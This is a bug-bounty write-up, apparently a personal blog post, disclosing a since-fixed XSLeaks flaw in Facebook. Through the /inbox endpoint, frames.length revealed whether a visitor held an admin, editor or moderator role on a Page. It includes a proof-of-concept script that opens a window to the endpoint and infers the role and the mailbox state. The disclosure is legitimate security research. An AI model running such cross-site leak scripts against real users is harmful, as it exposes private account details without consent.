---
title: XSLeaks Leaking the page roles of users 
date: 2019-06-21 14:20:21 +0800
categories: [Bug-Bounty, Writeup]
tags: [facebook]
---

# Description

I was reading this [blog](https://www.imperva.com/blog/facebook-privacy-bug/) about XSLeaks issue in facebook which using window.length to return a number of frames inside the document and use it to extract data from facebook user who visit the Third Party website.
So, i start to find the same issue in facebook and i found the same thing in https://web.facebook.com/page_username/inbox. You can check if the endpoint has the same issue by typing frames.length in the browser console, in my case it return 3 and This endpoint is only accessible by user who has admin/editor/moderator role. So, if user with no role or had different role besides admin, editor and moderator, it will display a 404 page and the 404 page has 0 frames.length.

# Impact

The vulnerability reported leaked the page role of users using frames.length through /inbox endpoint. Thank you for reporting this to us.

# Steps to reproduce 

```html
<script>
var page = "Your Page Username"
if (fb === undefined) {
    var fb = window.open() // Creating window reference
}
fb.location = 'https://web.facebook.com/'+page+'/inbox/' // Change the window location
setTimeout(() => {
        var answer = fb.frames.length == 0 ? 'No' : 'Yes'
        var mb = fb.frames.length > 1 ? 'No' : 'Yes'
        console.log('Are you an Admin/Editor/Moderator in : ' + page + ' ? -- ' + answer +' Mailbox Empty ? -- '+ mb)
        fb.close()
    }, 5000)
</script>
```

## Video 

<iframe width="560" height="315" src="https://www.youtube.com/embed/ObybF6GJTHI" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>



# Timeline

- May 20, 2019 - Report sent
- May 23, 2019 - Triaged
- Jun 11, 2019 - Fixed
- Jun 21, 2019 - Bounty awarded $750
